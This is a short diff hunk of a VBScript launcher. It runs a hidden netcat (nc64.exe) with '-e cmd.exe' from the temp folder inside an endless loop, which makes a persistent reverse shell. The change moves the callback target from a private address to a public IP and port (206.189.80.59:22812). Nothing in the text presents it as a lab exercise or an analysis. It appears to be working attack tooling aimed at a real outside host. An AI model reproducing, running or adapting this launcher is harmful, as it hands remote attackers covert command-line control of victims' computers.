@@ -4,7 +4,7 @@ Set objShell = CreateObject("WScript.Shell")
 tempFolder = objShell.ExpandEnvironmentStrings("%TEMP%")
 
 ' Define the command to run from the temporary folder
-commandToRun = """" & tempFolder & "\Quiet.exe"" """ & tempFolder & "\nc64.exe"" -e cmd.exe 172.31.197.56 4444"
+commandToRun = """" & tempFolder & "\Quiet.exe"" """ & tempFolder & "\nc64.exe"" -e cmd.exe 206.189.80.59 22812"
 
 ' Loop indefinitely
 Do
